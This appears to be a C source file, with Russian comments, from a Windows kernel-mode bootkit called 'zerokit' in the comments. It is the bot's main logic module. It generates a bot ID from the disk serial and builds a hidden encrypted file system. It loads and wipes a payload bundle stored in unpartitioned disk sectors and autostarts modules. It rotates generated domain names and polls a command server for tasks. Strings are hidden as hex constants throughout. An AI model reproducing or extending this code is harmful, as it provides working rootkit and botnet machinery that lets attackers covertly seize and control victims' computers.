#include <ntifs.h>
#include <wdm.h>
#include <ntstrsafe.h>

#include "../../mod_shared/headers.h"

#include "mod_logic.c"
#include "mod_logicApi.c"

NTSTATUS mod_logicEntry(uintptr_t modBase, pglobal_block_t pGlobalBlock)
{
    LARGE_INTEGER delay;
    KNOCK_RESULT knockResult = KR_NEED_NETWORK_RECONFIGURE;
    pmod_header_t pModHeader = (pmod_header_t)modBase;
    pmod_common_block_t pCommonBlock = pGlobalBlock->pCommonBlock;
    pmod_logic_block_t pLogicBlock;
    pmod_tasks_block_t pTasksBlock = pGlobalBlock->pTasksBlock;
    pmod_tcpip_block_t pTcpipBlock = pGlobalBlock->pTcpipBlock;
    uint8_t* packBuffer;
    uint8_t sha1Hash[20];
    uint8_t* bundleBuffer;
    uint32_t bundleSize;

    pCommonBlock->fncommon_allocate_memory(pCommonBlock, &pLogicBlock, sizeof(mod_logic_block_t), NonPagedPool);
    pGlobalBlock->pLogicBlock = pLogicBlock;
    pLogicBlock->pModBase = (uint8_t*)modBase;
    
// 
// #ifdef _WIN64
//     __debugbreak();
// #else
//     __asm int 3
// #endif // _WIN64


#ifndef _SOLID_DRIVER
    
#ifdef _WIN64
    pCommonBlock->fncommon_fix_addr_value((uint8_t*)getGlobalDataPtr, 11, GLOBAL_DATA_PATTERN, pGlobalBlock);
#else
    pCommonBlock->fncommon_fix_addr_value((uint8_t*)modBase + sizeof(mod_header_t), pModHeader->sizeOfModReal, GLOBAL_DATA_PATTERN, pGlobalBlock);
#endif // _WIN64

#endif // _SOLID_DRIVER

    DECLARE_GLOBAL_FUNC(pLogicBlock, logic_obtain_system_info);
//    DECLARE_GLOBAL_FUNC(pLogicBlock, logic_check_for_connection);
    DECLARE_GLOBAL_FUNC(pLogicBlock, logic_validate_server_response);
    DECLARE_GLOBAL_FUNC(pLogicBlock, logic_make_knock_to_server);
    DECLARE_GLOBAL_FUNC(pLogicBlock, logic_process_bundle);
    DECLARE_GLOBAL_FUNC(pLogicBlock, logic_process_tasks);
    DECLARE_GLOBAL_FUNC(pLogicBlock, logic_check_bundle_updates);
    DECLARE_GLOBAL_FUNC(pLogicBlock, logic_reconfigure);
    DECLARE_GLOBAL_FUNC(pLogicBlock, logic_save_config);
    DECLARE_GLOBAL_FUNC(pLogicBlock, logic_read_public_key);
    DECLARE_GLOBAL_FUNC(pLogicBlock, logic_generate_name_for_date);
    DECLARE_GLOBAL_FUNC(pLogicBlock, logic_check_for_new_period);
    DECLARE_GLOBAL_FUNC(pLogicBlock, logic_generate_names);
    DECLARE_GLOBAL_FUNC(pLogicBlock, logic_handle_key);
    DECLARE_GLOBAL_FUNC(pLogicBlock, logic_reload_overlord_config);

//     DECLARE_GLOBAL_FUNC(pLogicBlock, IopInterlockedInsertTailList);
//     DECLARE_GLOBAL_FUNC(pLogicBlock, MyIoRegisterLastChanceShutdownNotification);

    {
        uint8_t* ptr;
        uint8_t* ptr1;
        uint32_t len, i;
        phavege_state_t pHS;

        //static char alphas[16] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};
        ptr = (uint8_t*)pLogicBlock->alphas;
        *(((PUINT32)ptr)++) = 0x33323130; // 0123
        *(((PUINT32)ptr)++) = 0x37363534; // 4567
        *(((PUINT32)ptr)++) = 0x62613938; // 89ab
        *(((PUINT32)ptr)++) = 0x66656463; // cdef

        // Списое тестовых URL, на которые будут сгенерированны тестовые DNS-запросы.
        // Элементы в списке разделяются нулевым символом и признаком конца списка является пара нулевых символов.
//         ptr = (uint8_t*)pLogicBlock->testUrlList; // update.microsoft.com, windows.microsoft.com, support.microsoft.com, 
//         *(((PUINT32)ptr)++) = 0x61647075;    /* upda */
//         *(((PUINT32)ptr)++) = 0x6D2E6574;    /* te.m */
//         *(((PUINT32)ptr)++) = 0x6F726369;    /* icro */
//         *(((PUINT32)ptr)++) = 0x74666F73;    /* soft */
//         *(((PUINT32)ptr)++) = 0x6D6F632E;    /* .com */
//         *(((PUINT32)ptr)++) = 0x6E697700;    /* 0win */
//         *(((PUINT32)ptr)++) = 0x73776F64;    /* dows */
//         *(((PUINT32)ptr)++) = 0x63696D2E;    /* .mic */
//         *(((PUINT32)ptr)++) = 0x6F736F72;    /* roso */
//         *(((PUINT32)ptr)++) = 0x632E7466;    /* ft.c */
//         *(((PUINT32)ptr)++) = 0x73006D6F;    /* om0s */
//         *(((PUINT32)ptr)++) = 0x6F707075;    /* uppo */
//         *(((PUINT32)ptr)++) = 0x6D2E7472;    /* rt.m */
//         *(((PUINT32)ptr)++) = 0x6F726369;    /* icro */
//         *(((PUINT32)ptr)++) = 0x74666F73;    /* soft */
//         *(((PUINT32)ptr)++) = 0x6D6F632E;    /* .com */
//         *((PUINT16)ptr) = 0x0000;            /* 00   */
// 
//         pLogicBlock->currentUrl = pLogicBlock->testUrlList;

        ptr = pCommonBlock->fnExAllocatePoolWithTag(NonPagedPool, sizeof(UNICODE_STRING) + 16/*sizeof("Default")*/, LOADER_TAG);
        ptr1 = ptr + sizeof(UNICODE_STRING);
        *(((PUINT32)ptr1)++) = 0x00650044;    // \0D\0e
        *(((PUINT32)ptr1)++) = 0x00610066;    // \0f\0a
        *(((PUINT32)ptr1)++) = 0x006C0075;    // \0u\0l
        *((PUINT32)ptr1) = 0x00000074;        // \0t\0\0
        pCommonBlock->fnRtlInitUnicodeString((PUNICODE_STRING)ptr, (PCWSTR)(ptr + sizeof(UNICODE_STRING)));
        pLogicBlock->langKey = (PUNICODE_STRING)ptr;

        ptr = pCommonBlock->fnExAllocatePoolWithTag(NonPagedPool, sizeof(UNICODE_STRING) + 120/*sizeof("\Registry\Machine\System\ControlSet001\Control\Nls\Language")*/, LOADER_TAG);
        ptr1 = ptr + sizeof(UNICODE_STRING);
        *(((PUINT32)ptr1)++) = 0x0052005C;    // \0\\0R
        *(((PUINT32)ptr1)++) = 0x00670065;    // \0e\0g
        *(((PUINT32)ptr1)++) = 0x00730069;    // \0i\0s
        *(((PUINT32)ptr1)++) = 0x00720074;    // \0t\0r
        *(((PUINT32)ptr1)++) = 0x005C0079;    /* \0y\0\ */
        *(((PUINT32)ptr1)++) = 0x0061004D;    // \0M\0a
        *(((PUINT32)ptr1)++) = 0x00680063;    // \0c\0h
        *(((PUINT32)ptr1)++) = 0x006E0069;    // \0i\0n
        *(((PUINT32)ptr1)++) = 0x005C0065;    /* \0e\0\ */
        *(((PUINT32)ptr1)++) = 0x00790053;    // \0S\0y
        *(((PUINT32)ptr1)++) = 0x00740073;    // \0s\0t
        *(((PUINT32)ptr1)++) = 0x006D0065;    // \0e\0m
        *(((PUINT32)ptr1)++) = 0x0043005C;    // \0\\0C
        *(((PUINT32)ptr1)++) = 0x006E006F;    // \0o\0n
        *(((PUINT32)ptr1)++) = 0x00720074;    // \0t\0r
        *(((PUINT32)ptr1)++) = 0x006C006F;    // \0o\0l
        *(((PUINT32)ptr1)++) = 0x00650053;    // \0S\0e
        *(((PUINT32)ptr1)++) = 0x00300074;    // \0t\00
        *(((PUINT32)ptr1)++) = 0x00310030;    // \00\01
        *(((PUINT32)ptr1)++) = 0x0043005C;    // \0\\0C
        *(((PUINT32)ptr1)++) = 0x006E006F;    // \0o\0n
        *(((PUINT32)ptr1)++) = 0x00720074;    // \0t\0r
        *(((PUINT32)ptr1)++) = 0x006C006F;    // \0o\0l
        *(((PUINT32)ptr1)++) = 0x004E005C;    // \0\\0N
        *(((PUINT32)ptr1)++) = 0x0073006C;    // \0l\0s
        *(((PUINT32)ptr1)++) = 0x004C005C;    // \0\\0L
        *(((PUINT32)ptr1)++) = 0x006E0061;    // \0a\0n
        *(((PUINT32)ptr1)++) = 0x00750067;    // \0g\0u
        *(((PUINT32)ptr1)++) = 0x00670061;    // \0a\0g
        *((PUINT32)ptr1) = 0x00000065;        // \0e\0\0
        pCommonBlock->fnRtlInitUnicodeString((PUNICODE_STRING)ptr, (PCWSTR)(ptr + sizeof(UNICODE_STRING)));
        pLogicBlock->langsKey = (PUNICODE_STRING)ptr;

        *((uint32_t*)pGlobalBlock->sysPath) = 0x7379735C;
        *((uint32_t*)pGlobalBlock->usrPath) = 0x7273755C;

        ptr = (uint8_t*)pLogicBlock->overlordConfPath; // /usr/overlord/conf.z
        *(((PUINT32)ptr)++) = 0x7273752f;
        *(((PUINT32)ptr)++) = 0x65766f2f;
        *(((PUINT32)ptr)++) = 0x726f6c72;
        *(((PUINT32)ptr)++) = 0x6f632f64;
        *(((PUINT32)ptr)++) = 0x7a2e666e;
        *ptr = 0x00;

        // Проверяем существование нашей файловой системы.

        // Извлекаем и/или генерируем ключи. Имеется три типа ключей:
        // 1. Install Key - ключ, который генерируется единожды при установке зерокита в систему.
        // 2. BOOT Key - ключ, который генерируется каждый раз при запуске зерокита.
        // 3. FS Key - ключ, для файловой системы. В текущей реализации генерируется также при запуске зерокита.
        pCommonBlock->fncommon_allocate_memory(pCommonBlock, &pHS, sizeof(havege_state_t), NonPagedPool);
        pGlobalBlock->pCommonBlock->fnhavege_init(pHS);

        ptr = ptr1 = pGlobalBlock->pCommonBlock->pConfig->installKey;
        len = 0;
        for ( ; (ptr1 - ptr) < sizeof(pGlobalBlock->pCommonBlock->pConfig->installKey); ++ptr1) {
            len += *ptr1;
        }

        if (len == 0) { // Запускаемся первый раз, т. к. InstallKey ещё не создан.
            char uniqueId[35];
            size_t i, counter = 0;
            uint8_t md5Hash[16];
#if DBG
            pGlobalBlock->pCommonBlock->fncommon_disable_wp();
#endif // DBG
            // Генерируем ключ...
            pGlobalBlock->pCommonBlock->fnhavege_rand(pHS, ptr, sizeof(pGlobalBlock->pCommonBlock->pConfig->installKey));
#if DBG
            pGlobalBlock->pCommonBlock->fncommon_enable_wp();
#endif // DBG

            // Генерируем 64-байтный идентификатор бота.
            __stosb(uniqueId, 0, 35);
            __movsb(uniqueId, pGlobalBlock->pCommonBlock->pSysDiskInfo->serialNumber, 32);
            uniqueId[32] = (char)pGlobalBlock->osVer;
            uniqueId[33] = (char)pGlobalBlock->pCommonBlock->pConfig->sid;

            do {
                pGlobalBlock->pCommonBlock->fnmd5(uniqueId, 34, md5Hash);
                pGlobalBlock->pCommonBlock->fnmemset(uniqueId, 0, 35);
                for (i = 0; i < 16; ++i) {
                    uniqueId[2*i] = pGlobalBlock->pLogicBlock->alphas[(md5Hash[i] >> 4) & 0x0F];
                    uniqueId[2*i + 1] = pGlobalBlock->pLogicBlock->alphas[md5Hash[i] & 0x0F];
                }
#if DBG
                pGlobalBlock->pCommonBlock->fncommon_disable_wp();
#endif // DBG
                pGlobalBlock->pCommonBlock->fnmemcpy(pGlobalBlock->pCommonBlock->pConfig->botId + 32 * counter, uniqueId, 32);
#if DBG
                pGlobalBlock->pCommonBlock->fncommon_enable_wp();
#endif // DBGм
                pGlobalBlock->pCommonBlock->fnhavege_rand(pHS, uniqueId, 34);
            } while (counter++ < 1);

            // Сохраняем конфиг, для того, чтобы сохранить Install Key.
#if DBG == 0
            pLogicBlock->fnlogic_save_config();
#endif //
            pLogicBlock->bFirstTime = TRUE;
        }

        // Генерируем BootKey и FSKey.
        pGlobalBlock->pCommonBlock->fnhavege_rand(pHS, pGlobalBlock->pCommonBlock->bootKey, sizeof(pCommonBlock->bootKey));
        pGlobalBlock->pCommonBlock->fnhavege_rand(pHS, pGlobalBlock->pCommonBlock->fsKey, sizeof(pCommonBlock->fsKey));
        
        pCommonBlock->fnExFreePoolWithTag(pHS, LOADER_TAG);

        // Генерируем имя файла, используемое для блочного устройства.
        ptr1 = pLogicBlock->fsPath;
        *(((uint32_t*)ptr1)++) = 0x5C3F3F5C;
        *((uint32_t*)ptr1) = 0x005C3A43;
        pCommonBlock->fncommon_strcat_s(ptr1, MAX_PATH, pCommonBlock->sysVolInfoA);
        len = pCommonBlock->fncommon_strlen_s(ptr1, MAX_PATH);
        if (ptr1[len - 1] != '\\') {
            ptr1[len] = '\\';
        }
        ptr1 += pCommonBlock->fncommon_strlen_s(ptr1, MAX_PATH);
        *(ptr1++) = (uint8_t)'{';
        ptr = pCommonBlock->pConfig->installKey;
        {
            uint64_t count = 0x0602020204ULL;
            len = 0;
            for (i = 0; i < 5; ++i) {
                for ( ; ((uint8_t*)&count)[i]--; ++len) {
                    uint8_t ch = ptr[sizeof(pCommonBlock->pConfig->installKey) - len];
                    *(ptr1++) = pLogicBlock->alphas[(ch >> 4) & 0x0F];
                    *(ptr1++) = pLogicBlock->alphas[ch & 0x0F];
                }
                *(ptr1++) = '-';
            }
            *(--ptr1) = '}';
        }
        
        //ptr1 = pLogicBlock->fsPath + pCommonBlock->fncommon_strlen_s(pLogicBlock->fsPath, MAX_PATH);
        //*((uint32_t*)ptr1) = 0x7461642E;

        pGlobalBlock->pCommonBlock->fnsha1(pCommonBlock->pConfig->installKey, sizeof(pCommonBlock->pConfig->installKey), pCommonBlock->configKey);
        // Генерируем имя конфигурационного файла.
        ptr = pCommonBlock->configPath;
        *ptr++ = '\\';
        for (i = 0; i < 4; ++i) {
            ptr[2 * i] = pLogicBlock->alphas[(pCommonBlock->configKey[i] >> 4) & 0x0F];
            ptr[2 * i + 1] = pLogicBlock->alphas[pCommonBlock->configKey[i] & 0x0F];
        }

        ptr = pCommonBlock->configPrivatePath;
        *(uint32_t*)ptr = 0x7379735C;
        pGlobalBlock->pCommonBlock->fncommon_strcat_s(ptr, sizeof(pCommonBlock->configPrivatePath), pCommonBlock->configPath);

        // Пробуем открыть файл блочного устройства.
        do {
            if (pGlobalBlock->pFsBlock->pZfsIo == NULL) {
                break;
            }

            ptr = pGlobalBlock->pCommonBlock->pConfig->installKey;
            if (pGlobalBlock->pFsBlock->fnzfs_open_device(pGlobalBlock->pFsBlock->pZfsIo, pLogicBlock->fsPath, ptr, sizeof(pGlobalBlock->pCommonBlock->pConfig->installKey)) != ERR_OK) {
                if (pGlobalBlock->pFsBlock->fnbdev_create((const char*)pLogicBlock->fsPath, pCommonBlock->pConfig->fsSize * 1048576) != ERR_OK) {
                    break;
                }
                if (pGlobalBlock->pFsBlock->fnzfs_open_device(pGlobalBlock->pFsBlock->pZfsIo, pLogicBlock->fsPath, ptr, sizeof(pGlobalBlock->pCommonBlock->pConfig->installKey)) != ERR_OK) {
                    break;
                }

                if (pGlobalBlock->pFsBlock->fnzfs_format(pGlobalBlock->pFsBlock->pZfsIo) != ERR_OK) {
                    break;
                }
            }

            if (pGlobalBlock->pFsBlock->fnzfs_mount(pGlobalBlock->pFsBlock->pZfsIo) != ERR_OK) {
                pGlobalBlock->pFsBlock->fnzfs_close_device(pGlobalBlock->pFsBlock->pZfsIo);
                break;
            }

            if (pLogicBlock->bFirstTime) {
                bundle_info_entry_t bundleEntry;

                // Создаём элемент бандла для собственных обновлений.
                __stosb((uint8_t*)&bundleEntry, 0, sizeof(bundleEntry));
                *((uint32_t*)bundleEntry.name) = 0x61636E69;
                *((uint32_t*)(bundleEntry.name + 4)) = 0x74616E72;
                *((uint32_t*)(bundleEntry.name + 8)) = 0x006E6F69;
#if DBG
                bundleEntry.updatePeriod = 1; // 1 минута
#else
                bundleEntry.updatePeriod = 420; // 7 часов
#endif // DBG
                pGlobalBlock->pTasksBlock->fntasks_save_bundle_entry(&bundleEntry);
// 
//                 // Создаём папку \sys
//                 sysName[0] = 0x7379735C;
                pGlobalBlock->pFsBlock->fnzfs_mkdir(pGlobalBlock->pFsBlock->pZfsIo, pGlobalBlock->sysPath, ZFS_SPECIAL_SYSTEM);

//                 // Создаём папку \usr
//                 sysName[0] = 0x7273755C;
                pGlobalBlock->pFsBlock->fnzfs_mkdir(pGlobalBlock->pFsBlock->pZfsIo, pGlobalBlock->usrPath, 0);

//                 // Создаём папку \sys\ex
//                 sysName[0] = 0x7379735C;
//                 sysName[1] = 0x0078655C;
//                 pGlobalBlock->pFsBlock->fnzfs_mkdir(pGlobalBlock->pFsBlock->pZfsIo, (const char*)&sysName, ZFS_SPECIAL_SYSTEM);

            }

            pLogicBlock->useFs = 1;
        } while (0);
    }

    // Загружаем все mod-расширения.

    // Модуль mod_launcher.
//     {
//         // Запускаем дополнительный следящий за конфигом поток, если файловая система была проинициализирована.
//         HANDLE hThread = NULL;
//         OBJECT_ATTRIBUTES fObjectAttributes;

    // Проверяем наличие бандла в неразмеченной области диска.
    if (pLogicBlock->useFs && pCommonBlock->zerokitHeader.sizeOfBundle != 0) {
        NTSTATUS ntStatus;

        pCommonBlock->fncommon_allocate_memory(pCommonBlock, &packBuffer, pCommonBlock->zerokitHeader.sizeOfBundle, NonPagedPool);

        if ((ntStatus = pGlobalBlock->pCommonBlock->fncommon_dio_read_sector(pCommonBlock->pBootDiskInfo, packBuffer, pCommonBlock->zerokitHeader.sizeOfBundle, pCommonBlock->bodySecOffset + pCommonBlock->zerokitHeader.sizeOfPack + pCommonBlock->zerokitHeader.sizeOfConfig)) == STATUS_SUCCESS) {
            if (pLogicBlock->fnlogic_process_bundle(packBuffer, &bundleBuffer, &bundleSize, sha1Hash) == 0) {
                if (pGlobalBlock->pLauncherBlock->fnlauncher_process_bundle((pbundle_header_t)bundleBuffer, sha1Hash, TRUE)) {
                    uint32_t sizeOfBundle = pCommonBlock->zerokitHeader.sizeOfBundle;
                    pCommonBlock->zerokitHeader.sizeOfBundle = 0;
                    pGlobalBlock->pProtectorBlock->hZkRegion->needProtect = FALSE;
                    if ((ntStatus = pCommonBlock->fncommon_dio_write_sector(pCommonBlock->pBootDiskInfo, &pCommonBlock->zerokitHeader, sizeof(pCommonBlock->zerokitHeader), pCommonBlock->bodySecOffset + pCommonBlock->pBootDiskInfo->bytesPerSector * 3 + 2)) == STATUS_SUCCESS) {
                        // Обнуляем область на диске, где лежал бандл 
                        __stosb(packBuffer, 0, sizeOfBundle);
                        pGlobalBlock->pCommonBlock->fncommon_dio_write_sector(pCommonBlock->pBootDiskInfo, packBuffer, sizeOfBundle, pCommonBlock->bodySecOffset + pCommonBlock->zerokitHeader.sizeOfPack + pCommonBlock->zerokitHeader.sizeOfConfig);
                    }
                    pGlobalBlock->pProtectorBlock->hZkRegion->needProtect = TRUE;
                }
                pCommonBlock->fnExFreePoolWithTag(bundleBuffer, LOADER_TAG);
            }
        }

        pCommonBlock->fnExFreePoolWithTag(packBuffer, LOADER_TAG);
    }

    // Проводим окончательную инициализацию исполнительной подсистемы.
    pGlobalBlock->pLauncherBlock->fnlauncher_stage1_init();

    // Инициализируем списки модулей для автозапуска.
    if (pGlobalBlock->pLogicBlock->useFs) {
        // Модули с флагом FLAG_AUTOSTART.
        pGlobalBlock->pLauncherBlock->fnlauncher_autostart_modules();
    }

//         // Создаём поток, который будет отслеживать изменения в конфиге и подхватывать их.
//         InitializeObjectAttributes(&fObjectAttributes, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
//         pCommonBlock->fnPsCreateSystemThread(&hThread, /*0x001F03FF*/THREAD_ALL_ACCESS, &fObjectAttributes, 0, 0, (PKSTART_ROUTINE)pGlobalBlock->pLauncherBlock->fnlauncher_helper_thread, NULL);
//         pCommonBlock->fnObReferenceObjectByHandle(hThread, STANDARD_RIGHTS_ALL, *pCommonBlock->pPsThreadType, KernelMode, &pGlobalBlock->pLauncherBlock->pHelperThreadObject, NULL);
//         pCommonBlock->fnZwClose(hThread);
//     }
// 
//     // Вычисляем адрес списка обработчиков завершения системы (IopNotifyLastChanceShutdownQueueHead).
//     {
//         uint8_t* ptr = (uint8_t*)pCommonBlock->fnIoRegisterLastChanceShutdownNotification;
//         NTSTATUS ntStatus;
//         dissasm_info_t hde;
// 
//         for ( ; ; ptr += hde.len) {
//             pGlobalBlock->pDissasmBlock->fndissasm(ptr, &hde);
// #ifdef _WIN64
// #else
//             if (hde.len == 3 && hde.opcode == 0xC2 && *(uint16_t*)(ptr + 1) == 0x0004) {
//                 break;
//             }
//             else if (hde.len == 5 && (hde.opcode & 0xF8) == 0xB8) {
//                 pLogicBlock->pIopNotifyLastChanceShutdownQueueHead = (PLIST_ENTRY)(*(uint32_t*)(ptr + 1));
//             }
// #endif // _WIN64
//         }
// 
//         pGlobalBlock->pUserioBlock->pNullDevObject->DriverObject->MajorFunction[IRP_MJ_SHUTDOWN] = pGlobalBlock->pUserioBlock->pNullDevObject->DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL];
//         ntStatus = pGlobalBlock->pLogicBlock->fnMyIoRegisterLastChanceShutdownNotification(pGlobalBlock->pUserioBlock->pNullDevObject);
//     }

    // Стартуем tcpip-поток...
    pTcpipBlock->fntcpip_start_thread(0);

//     // Ожидаем минуту
//     delay.QuadPart = -600000000I64; // 1 секунда.
//     pGlobalBlock->pCommonBlock->fnKeDelayExecutionThread(KernelMode, FALSE, &delay);

    delay.QuadPart = -10000000I64; // 1 секунда.

    for ( ; pGlobalBlock->shutdownToken == 0; ) {
        int zzz = 0;
        for ( ; zzz < 25 && pGlobalBlock->pLauncherBlock->modulesPending == 0; ++zzz) {
            pGlobalBlock->pCommonBlock->fnKeDelayExecutionThread(KernelMode, FALSE, &delay);
        }

        if (pLogicBlock->rotateTimeout > 0) {
            pLogicBlock->rotateTimeout -= min(zzz, pLogicBlock->rotateTimeout); // zzz секунды.
        }

        // Получаем снимок времени.
        pLogicBlock->systemTime = pCommonBlock->fncommon_get_system_time();

        // Каждые 25 секунд или по сигналу проверяем наличие необходимости обработки модулей (новых или старых).
        if (pGlobalBlock->pLauncherBlock->modulesPending > 0 || (pLogicBlock->systemTime >= (pLogicBlock->launcherTime + 7))) {
            pLogicBlock->launcherTime = pLogicBlock->systemTime;
            // Сбрасываем индикатор ожидающих модулей.
            InterlockedExchange((PLONG)&pGlobalBlock->pLauncherBlock->modulesPending, 0);

            pGlobalBlock->pLauncherBlock->fnlauncher_process_modules();
        }

        if (pLogicBlock->rotateTimeout > 0) {
            continue;
        }

//         {
//             LARGE_INTEGER delay;
//             ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//             delay.QuadPart = -30000000I64;
//             for ( ; ; ) {
//                 pGlobalBlock->pCommonBlock->fnKeDelayExecutionThread(KernelMode, FALSE, &delay);
//             }
//             ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//         }
        if (knockResult == KR_NEED_NETWORK_RECONFIGURE || (pGlobalBlock->pNetworkBlock->needReconfigure && pGlobalBlock->pNetcommBlock->userMode == 0)) {
            if (!pLogicBlock->fnlogic_reconfigure(FALSE)) {
                continue;
            }

            pLogicBlock->needChangeServer = TRUE;
            knockResult = KR_OK;
        }

        if (pGlobalBlock->pNetcommBlock->userMode == 1) {
            if (pLogicBlock->systemTime >= (pLogicBlock->checkNDISAccessable + NDIS_NET_CHECKOUT)) {
                // Периодически проверяем доступность NDIS-варианта сети.
                pLogicBlock->checkNDISAccessable = pLogicBlock->systemTime;
                if (pLogicBlock->fnlogic_reconfigure(TRUE)) {
                    pGlobalBlock->pNetcommBlock->userMode = 0;
                }
            }
        }
        else {
            // Валидация хуков только, если используется наш стек.
            pGlobalBlock->pNetworkBlock->fnnetwork_validate_hooks();
        }

        // Проверяем, обновился ли конфиг оверлорда
        if (pLogicBlock->useFs && pLogicBlock->systemTime >= (pLogicBlock->checkOverlordConfTime + OVERLORD_CONF_CHECKOUT)) {
            uint32_t unixTime;

            pLogicBlock->checkOverlordConfTime = pLogicBlock->systemTime;

            pGlobalBlock->pFsBlock->fnzfs_get_time(pGlobalBlock->pFsBlock->pZfsIo, pLogicBlock->overlordConfPath, ETimeMod, &unixTime, 0);

            if (unixTime != 0 && unixTime != pLogicBlock->overlordConfUnixTime) {
                pLogicBlock->overlordConfUnixTime = unixTime;
                pGlobalBlock->pLogicBlock->fnlogic_reload_overlord_config();
            }
        }
// #ifdef _WIN64
//         __debugbreak();
// #else
//         __asm int 3
// #endif // _WIN64
//        ++sessionCounter;
        pLogicBlock->needCheckTasks = (pLogicBlock->systemTime >= (pLogicBlock->checkTasksTime + 60 * pCommonBlock->pConfig->rtr_check_tasks_timeout));
        pLogicBlock->needCheckBundleUpdates = (pLogicBlock->systemTime >= (pLogicBlock->checkBundlesTime + BUNDLES_CHECKOUT));
        
        if (pLogicBlock->needCheckTasks || pLogicBlock->needCheckBundleUpdates) {
            if (pLogicBlock->fnlogic_check_for_new_period()) {
                if ((pGlobalBlock->pCommonBlock->pConfig->rtr_names_lifetime == 0) ||
                    ((pGlobalBlock->pLogicBlock->lastNtpTime - pGlobalBlock->pCommonBlock->pConfig->lastNtpGenTime) / 3600) >= pGlobalBlock->pCommonBlock->pConfig->rtr_names_lifetime) {
                        // Генерируем новый список имён только в случае, когда у нас не указан срок жизни рабочего списка домена или срок жизни уже окончился.
                        pLogicBlock->fnlogic_generate_names();
                        pLogicBlock->needChangeServer = TRUE;
                }
            }

            // 1. Выбирается активное имя из списка rtr_names (при первом запуске это самое первое, в любом другом случае,
            //    это текущее на момент включения/ребута машины имя).
            pGlobalBlock->pNetcommBlock->fnnetcomm_select_active_element(TRUE);

            // 2. Выбирается активная зона из списка rtr_zones (аналогично выборке имени).
            pGlobalBlock->pNetcommBlock->fnnetcomm_select_active_element(FALSE);

            // 3. Резолв домена. Если резолв успешный, то переходим на шаг 4. Иначе переходим на шаг 7.
            if (knockResult == KR_NEED_NETCOMM_RECONFIGURE || !pGlobalBlock->pNetcommBlock->fnnetcomm_resolve_active_domain()) {
                if (knockResult == KR_NEED_NETCOMM_RECONFIGURE) {
                    uint32_t oldValue = pLogicBlock->failedCounter++;
                    if (oldValue > 0 && (oldValue % pCommonBlock->pConfig->rtr_names_count) == 0) {
                        knockResult = KR_NEED_NETWORK_RECONFIGURE;
                        continue;
                    }
                }

                knockResult = KR_OK;
                pLogicBlock->rotateTimeout = pGlobalBlock->pNetcommBlock->fnnetcomm_rotate();

                // Сохраняем конфиг
                pGlobalBlock->pLogicBlock->fnlogic_save_config();

                pLogicBlock->needChangeServer = TRUE;
                if (pLogicBlock->rotateTimeout == 0) {
                    ++pLogicBlock->rotateCounter;
                    pLogicBlock->rotateTimeout = ((pLogicBlock->rotateCounter % pCommonBlock->pConfig->rtr_all_names_attempts) == (pCommonBlock->pConfig->rtr_all_names_attempts - 1)) ? 
                        pCommonBlock->pConfig->rtr_all_names_timeout : pCommonBlock->pConfig->rtr_end_of_names_timout;
                }
                continue;
            }
        }

        // 4. Отстукиваем на сервер. Если ответ получен, то переходим на шаг 5. Если проблемы локальны с сетью, то делается
        // реинициализация сети и переходим к шагу 1. Если от сервера пришёл кривой ответ, то ждём 25 секунд, наращиваем счётчик
        // попыток и если он меньше 3, то повторяем шаг 4, если больше, то переходим на шаг 7.
        do {
            // Обновление бандлов (каждые BUNDLES_CHECKOUT секунд).
            if (pLogicBlock->needCheckBundleUpdates) {
                pLogicBlock->checkBundlesTime = pLogicBlock->systemTime;

                knockResult = pLogicBlock->fnlogic_check_bundle_updates();
                if (pGlobalBlock->shutdownToken != 0) {
                    break;
                }
            }

            // Взаимодействие с сервером.
            if (pLogicBlock->needCheckTasks) {
                // Отправляем информацию на сервер.
                if (pLogicBlock->needChangeServer) {
                    // Получаем нужную информацию о системе.
                    pLogicBlock->fnlogic_obtain_system_info();

                    knockResult = pLogicBlock->fnlogic_make_knock_to_server(NRT_SYSTEM_INFO);
                    if (knockResult != KR_OK) {
                        break;
                    }
                    pLogicBlock->needChangeServer = FALSE;
                }

                // Запрашиваем у сервера новые задания и отправляем отчёты о выполненных ранее заданиях.
                knockResult = pLogicBlock->fnlogic_make_knock_to_server(NRT_TASKS_REQUEST);
                if (knockResult != KR_OK) {
                    break;
                }

                // Выполняем задачи в очереди ожидания...
                pLogicBlock->fnlogic_process_tasks();

                // Отправляем отчёты о выполненных ранее заданиях.
                if (pTasksBlock->fntasks_get_completed_task_count() > 0) {
                    knockResult = pLogicBlock->fnlogic_make_knock_to_server(NRT_TASKS_REPORT);
                    if (knockResult != KR_OK) {
                        break;
                    }
                }

                // Фиксируем время, только когда всё прошло успешно.
                pLogicBlock->checkTasksTime = pLogicBlock->systemTime;
            }
        } while (0);
     }

    // Заверашем работу исполнительной подсистемы.
    pGlobalBlock->pLauncherBlock->fnlauncher_shutdown_routine();
    pGlobalBlock->pUserioBlock->fnuserio_shutdown_routine();
    pGlobalBlock->pNetcommBlock->fnnetcomm_shutdown_routine();
    pGlobalBlock->pTcpipBlock->fntcpip_shutdown_routine();
    pGlobalBlock->pNetworkBlock->fnnetwork_shutdown_routine();
    pGlobalBlock->pTasksBlock->fntasks_shutdown_routine();
    pGlobalBlock->pProtectorBlock->fnprotector_shutdown_routine();
    pGlobalBlock->pFsBlock->fnfs_shutdown_routine();

    // Здесь мы должны завершить работу, выгрузить/перераспределить все моды и передать управление новой цепочке.
    {
        pCommonBlock->fnExFreePoolWithTag(pLogicBlock->langKey, LOADER_TAG);
        pCommonBlock->fnExFreePoolWithTag(pLogicBlock->langsKey, LOADER_TAG);
    }

    return STATUS_SUCCESS;
}
